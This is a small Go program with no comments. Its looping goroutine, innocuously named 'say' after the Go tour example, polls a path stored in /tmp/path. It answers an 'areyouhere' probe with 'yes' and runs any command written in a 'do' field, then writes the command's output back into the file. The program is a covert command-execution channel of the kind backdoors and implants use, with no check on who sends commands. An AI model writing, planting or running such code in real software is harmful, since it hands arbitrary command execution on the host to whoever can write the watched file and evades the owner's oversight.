package main

import (
    "fmt"
    "time"
    "sync"
    "io/ioutil"
    "strings"
    "os/exec"
)

func say(s string,w sync.WaitGroup) {
    for 
    {
        time.Sleep(1000 * time.Millisecond)
        dat, _ := ioutil.ReadFile("/tmp/path")
	    path :=string(dat) 
  		
  		cached, _ := ioutil.ReadFile(path)
  		
	   	strs :=strings.Split(string(cached),"=")
		
		ll:=len(strs)
		if (ll ==2 ){
			if(strs[1]=="areyouhere"){
				echoStr := "yes"
    			ioutil.WriteFile(path, []byte(fmt.Sprintf("%s,%s",echoStr,path)) , 0644)
			}
		}else if(ll == 3){
			if(strs[1]=="do"){
				fmt.Println(strs[2])
				cmdArr :=strings.Split(strs[2]," ")
				result := cmdArr[1: len(cmdArr)]
				cmd := exec.Command(cmdArr[0],result...)
    			out, err := cmd.CombinedOutput() 
    			if(err!=nil){
    				fmt.Println(err)
    			} 
    			ioutil.WriteFile(path, out, 0644)
			}
		}
    }
}

func main (){
	
	var w sync.WaitGroup
	w.Add(1)
	go say("world",w)
	w.Wait()

}

